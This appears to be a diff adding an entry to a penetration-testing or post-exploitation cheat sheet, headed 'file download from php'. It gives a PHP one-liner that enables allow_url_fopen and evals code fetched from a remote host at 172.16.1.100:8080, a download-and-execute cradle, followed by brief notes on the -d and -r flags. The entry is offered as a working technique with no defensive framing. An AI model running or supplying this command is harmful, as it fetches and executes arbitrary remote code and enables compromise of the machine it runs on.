@@ -1,0 +1,6 @@
+====[ PHP ]====
+file download from php 
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.100:8080/ko3Rb1zps9VTa'));"
+	-d foo[=bar]     Define INI entry foo with value 'bar'
+		allow_url_fopen directive that enable write scripts that open remote files as if they are local files
+	-r <code>        Run PHP <code> without using script tags <?..?>
